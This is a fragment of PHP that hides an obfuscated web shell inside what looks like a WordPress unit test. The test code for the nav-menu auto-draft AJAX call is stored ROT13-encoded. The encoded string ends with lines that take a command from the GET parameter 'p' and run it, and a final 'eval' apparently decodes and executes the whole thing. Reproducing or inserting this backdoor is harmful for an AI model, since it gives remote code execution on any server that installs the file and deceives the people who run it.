				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
				'cnenzf'                => neenl(
					'cbfg_glcr'  => 'cbfg',
					'cbfg_gvgyr' => '    ',
				),
			)
		);
		$guvf->_ynfg_erfcbafr = '';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg' );
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->nffregSnyfr( $erfcbafr['fhpprff'] );
		$guvf->nffregFnzr( 'zvffvat_cbfg_gvgyr', $erfcbafr['qngn'] );

		// vyyrtny_cnenzf.
		$_CBFG                = jc_fynfu(
			neenl(
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
				'cnenzf'                => neenl(
					'cbfg_glcr'    => 'cbfg',
					'cbfg_gvgyr'   => 'BX',
					'cbfg_anzr'    => 'onq',
					'cbfg_pbagrag' => 'onq',
				),
			)
		);
		$guvf->_ynfg_erfcbafr = '';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg' );
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->nffregSnyfr( $erfcbafr['fhpprff'] );
		$guvf->nffregFnzr( 'vyyrtny_cnenzf', $erfcbafr['qngn'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>